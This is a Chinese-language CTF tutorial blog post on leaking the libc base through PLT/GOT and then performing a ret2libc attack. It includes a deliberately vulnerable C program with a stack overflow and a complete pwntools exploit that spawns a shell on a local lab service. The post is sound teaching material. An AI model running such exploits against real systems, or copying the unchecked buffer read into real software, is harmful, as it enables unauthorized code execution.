---
title: "Day16－PLT to Libc"
date: 2024-09-16
draft: false
tags: ["iron-man-2024", "pwn", "binary-exploitation"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## [Lab 網址](https://github.com/YJK0805/PWN-CTF-note/)

## 前言

昨天我們示範了如何在沒有拿到 libc base 且程式是動態鏈結的情況下，透過 PLT 拿到 shell。不過那是因為程式一開始就有呼叫一次 `system` 函式，使得在編譯過程中產生了 GOT 和 PLT。如果沒有呼叫過該函式，是不是就無法被攻擊了呢？其實不是，因為我們可以透過 PLT 和 GOT 嘗試取得程式中的 libc base，並進行 ret2libc 攻擊。

## plt & got leak libc

如之前所提，GOT 會存儲外部函式的地址。即便我們不知道具體的 libc base，也可以將某些函式的 GOT 地址作為參數，傳遞給可以輸出資訊的函式，如 `puts`，來洩露 libc 地址並計算出 libc base。具體上傳遞參數的過程會像這樣：`puts(got_address)`。

這裡需要注意，若程式的 RELRO 是 Partial，我們需要函式的地址被解析完成後才能使用。有些讀者可能會問：既然我們不知道 libc base，那要如何呼叫 `puts` 呢？實際上，我們可以直接呼叫 PLT，因為 PLT 會自動從 GOT 中取出地址，也就是 libc 內部的函式地址。如此一來，我們就能成功呼叫 `puts` 並取得 libc base，進而進行簡單的 ret2libc 攻擊。

## Lab

查看以下原始碼：

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void pop_rdi(){
    __asm__("pop %rdi; ret;");
}

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    char message[0x10];
    puts("Welcome to challenge!");
    puts("Leave a message: ");
    read(0, message, 0x100);
    return 0;
}
```

使用以下指令進行編譯：

```bash
gcc src/ret2plt_adv.c -o ./ret2plt_adv/share/ret2plt_adv -fno-stack-protector -no-pie
```

## writeup

這次的程式與前幾天的不同，分析後我們發現有一個 `read` 的 overflow，可以用來控制程式的執行流。不過因為是動態鏈結，gadgets 可能不足以構造完整的 ROP chain，所以我們需要從 libc 中尋找 gadgets。然而，要使用 libc，必須先泄露 libc base，但程式中沒有像格式化字串或 out-of-bounds (OOB) 等可直接泄露 libc 的漏洞。幸運的是，我們可以控制程式的執行流，並且程式內有 `puts` 函式，因此我們可以將某個函式的 GOT 地址作為參數傳入 `puts`，取得該函式的 libc 地址，進而計算出 libc base。

有了 libc base 後，我們可以再一次輸入並觸發 overflow，完成 ret2libc 攻擊。值得一提的是，我特地加了一個 `pop rdi; ret`，以便傳遞參數。

所以我們要確認以下資訊

- `puts` 的 PLT 地址
- 已被解析的某個函式的 GOT 地址
- `main` 的地址（泄露 libc 後返回重新輸入）

這些資訊可以用 `objdump` 輕鬆找出。

![image](/images/iron2024/day16_image1.png)

我們來測試一下是否能成功泄露 libc 地址，並接上 gdb 計算 offset。

在測試之前，因為要針對 libc，所以需要更換 libc，具體操作可參照[Day13－How to change libc & ret2libc](https://ithelp.ithome.com.tw/articles/10359126)

需要控制流的 padding 為 `0x10+0x8=0x18`。

![image](/images/iron2024/day16_image2.png)

接下來，使用以下 script 進行測試：

```python
from pwn import *

r = process('./ret2plt_adv')
context.terminal = ['tmux','splitw','-h']
gdb.attach(r)
setvbuf_got = 0x404010
puts_plt = 0x0000000000401030
pop_rdi = 0x000000000040114a
main = 0x00000000040114f
payload = b'A' * (0x10 + 8) + p64(pop_rdi) + p64(setvbuf_got) + p64(puts_plt) + p64(main)
r.sendlineafter('Leave a message: ', payload)
libc = u64(r.recvuntil(b'\x7f').strip().ljust(8, b'\x00'))
print(hex(libc))
r.interactive()
```

我們可以成功泄露一些資訊，並確認 offset 為 `0x815f0`。

![image](/images/iron2024/day16_image3.png)

![image](/images/iron2024/day16_image4.png)

接下來，將泄露到的地址減去 `0x815f0` 來測試，發現確實成功泄露到 libc base。

![image](/images/iron2024/day16_image5.png)

由於程式最後接回了 `main`，因此有再次輸入的機會，此時就可以進行 ret2libc，具體步驟可參考 [Day13－How to change libc & ret2libc](https://ithelp.ithome.com.tw/articles/10359126) 的步驟

完整 exploit：

```python
from pwn import *

# r = process('../ret2plt_adv/share/ret2plt_adv')
r = remote('127.0.0.1',10008)
setvbuf_got = 0x404010
puts_plt = 0x0000000000401030
pop_rdi = 0x000000000040114a
main = 0x00000000040114f
payload = b'A' * (0x10 + 8) + p64(pop_rdi) + p64(setvbuf_got) + p64(puts_plt) + p64(main)
r.sendlineafter('Leave a message: ', payload)
libc = u64(r.recvuntil(b'\x7f').strip().ljust(8, b'\x00')) - 0x815f0
log.info('Libc: ' + hex(libc))
system = libc + 0x50d70
bin_sh = libc + 0x1d8678
ret = pop_rdi + 1
payload = b'A' * (0x10 + 8) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendlineafter('Leave a message: ', payload)
r.interactive()
```

solved！！

![image](/images/iron2024/day16_image6.png)
